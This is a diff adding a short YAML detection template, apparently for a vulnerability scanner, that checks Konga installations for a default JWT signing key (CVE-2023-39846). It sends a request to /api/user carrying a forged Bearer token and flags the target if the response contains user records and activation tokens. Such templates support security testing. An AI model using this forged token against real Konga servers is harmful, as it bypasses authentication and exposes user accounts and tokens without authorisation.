@@ -1,0 +1,24 @@
+id: poc-yaml-konga-default-jwt-key
+info:
+  name: Konga 默认 JWT 密钥
+  severity: high
+  tags:
+  - CVE-2023-39846
+  - 认证绕过
+  finger: Konga
+requests:
+- method: GET
+  path: /api/user
+  headers:
+    Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.MQ.Lu-KcR4aCeuT9hi1K474zV3s4VaopLDCcf4nZvH6DQo
+  expression: 'contains(headers, "json") &&
+
+    contains(body, "updatedUser") &&
+
+    contains(body, "activationToken") &&
+
+    !contains(body, "<")
+
+    '
+variables: {}
+transport: http
